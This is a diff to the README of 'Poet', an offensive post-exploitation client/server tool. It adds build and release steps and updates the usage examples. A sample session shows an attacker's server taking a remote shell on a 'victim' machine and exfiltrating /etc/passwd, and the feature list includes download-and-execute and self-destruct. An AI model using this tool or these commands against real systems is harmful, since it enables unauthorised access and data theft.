@@ -17,6 +17,31 @@ on the target including:
 - download and execute
 - self destruct
 
+## getting started
+
+Go to the [releases](http://github.com/mossberg/poet/releases) page and
+download the latest `poet-client.zip` and `poet-server.zip` files available.
+Then skip to the Usage section below.
+
+Alternatively, you can build Poet yourself (it's pretty easy). Make sure you
+have the `python2.7` and `zip` executables available.
+
+```
+$ git clone https://github.com/mossberg/poet
+$ cd poet
+$ make
+```
+
+This will create a `build/` directory which contains `poet-client.zip`
+and `poet-server.zip`.
+
+Wondering why Poet is distributed as zip file rather than regular python
+scripts?  This is because of shared code between the client and server and the
+requirement that the client be a single file. Rather than manually keeping
+copies of the shared code in sync between files, packaging the main and shared
+code into a zip file that can be passed to the Python interpreter was a cleaner
+solution.
+
 ## usage
 
 Poet is super easy to use, and requires nothing more than the Python (2.7)
@@ -25,25 +50,30 @@ standard library. To easily try it out, a typical invocation would look like:
 Terminal 1:
 
 ```
-$ ./client.py -v 127.0.0.1 1
+$ python2.7 poet-client.zip -v 127.0.0.1 1
 ```
 
 Terminal 2:
 
 ```
-$ sudo ./server.py
+$ sudo python2.7 poet-server.zip
 ```
 
-Note: By default, the server needs to be run as root (using `sudo`) because the
-default port it binds to is 443. If that makes you uncomfortable, simply omit
-`sudo` and use the `-p <PORT>` flag on both the client and server. Pick a
-nice, high number for your port (> 1024).
+Note:
+
+- You **need** to specifically pass the zip files to the Python interpreter.
+  Executing them as if they were a binaries a la `./poet-client.zip` will not
+  work.
+- By default, the server needs to be run as root (using `sudo`) because the
+  default port it binds to is 443. If that makes you uncomfortable, simply omit
+  `sudo` and use the `-p <PORT>` flag on both the client and server. Pick a
+  nice, high number for your port (> 1024).
 
 Of course, using the `-h` flag gives you the full usage.
 
 ```
-$ ./client.py -h
-usage: client.py [-h] [-p PORT] [-v] [-d] IP INTERVAL
+$ python2.7 poet-client.zip -h
+usage: poet-client.zip [-h] [-p PORT] [-v] [-d] IP [INTERVAL]
 
 positional arguments:
   IP                    server
@@ -55,8 +85,8 @@ optional arguments:
   -v, --verbose
   -d, --delete          delete client upon execution
 
-$ ./server.py -h
-usage: server.py [-h] [-p PORT]
+$ python2.7 poet-server.zip -h
+usage: poet-server.zip [-h] [-p PORT]
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -78,32 +108,40 @@ the next opportunity to connect to the server.
 Victim's Machine (5.4.3.2):
 
 ```
-$ ./client.py -v 1.2.3.4 10
-[+] Poet started with delay of 10 seconds to port 443. Ctrl-c to exit.
-[!] (2014-09-06 02:07:03.058921) Server is inactive
-[!] (2014-09-06 02:07:13.060840) Server is inactive
-[!] (2014-09-06 02:07:23.062512) Server is inactive
-[!] (2014-09-06 02:07:33.064214) Server is inactive
-[+] (2014-09-06 02:07:43.066828) Server is active
-[!] (2014-09-06 02:08:50.403668) Server is inactive
-[!] (2014-09-06 02:09:00.405364) Server is inactive
+$ python2.7 poet-client.zip -v 1.2.3.4 10
+[+] Poet started with interval of 10 seconds to port 443. Ctrl-c to exit.
+[!] (2015-03-27 03:40:12.259676) Server is inactive
+[!] (2015-03-27 03:40:22.263161) Server is inactive
+[!] (2015-03-27 03:40:32.267308) Server is inactive
+[+] (2015-03-27 03:40:42.273376) Server is active
+[!] (2015-03-27 03:41:07.145979) Server is inactive
+[!] (2015-03-27 03:41:17.150634) Server is inactive
+[!] (2015-03-27 03:41:27.155614) Server is inactive
+[!] (2015-03-27 03:41:37.160440) Server is inactive
 ```
 
 Attacker's Machine (1.2.3.4):
 
 ```
-# ./server.py
+# python2.7 poet-server.zip
+                          _
+        ____  ____  ___  / /_
+       / __ \/ __ \/ _ \/ __/
+      / /_/ / /_/ /  __/ /
+     / .___/\____/\___/\__/     v0.4
+    /_/
+
 [+] Poet server started on 443.
-[i] (2014-09-06 02:07:43.066092) Connected By: ('5.4.3.2', 62209)
-[+] (2014-09-06 02:07:43.066531) Entering control shell
-Welcome to psh, the poet shell!
+[+] (2015-03-27 03:40:42.272601) Connected By: ('5.4.3.2', 59309) -> VALID
+[+] (2015-03-27 03:40:42.273087) Entering control shell
+Welcome to psh, the Poet shell!
 Running `help' will give you a list of supported commands.
 psh > shell
 psh > user@server $ uname -a
 Linux lolServer 3.8.0-29-generic #42~precise1-Ubuntu SMP Wed May 07 16:19:23 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
 psh > user@server $ ^D
 psh > exfil /etc/passwd
-psh : exfil written to archive/20140906/exfil/passwd
+psh : exfil written to archive/20150327/exfil/passwd-201503274054.txt
 psh > help
 Commands:
   chint
@@ -116,8 +154,8 @@ Commands:
   selfdestruct
   shell
 psh > exit
-[+] (2014-09-06 02:08:40.401181) Exiting control shell.
-[-] (2014-09-06 02:08:40.401328) Poet terminated.
+[+] (2015-03-27 03:40:57.144083) Exiting control shell.
+[-] (2015-03-27 03:40:57.144149) Poet server terminated.
 ```
 
 ## disclaimer
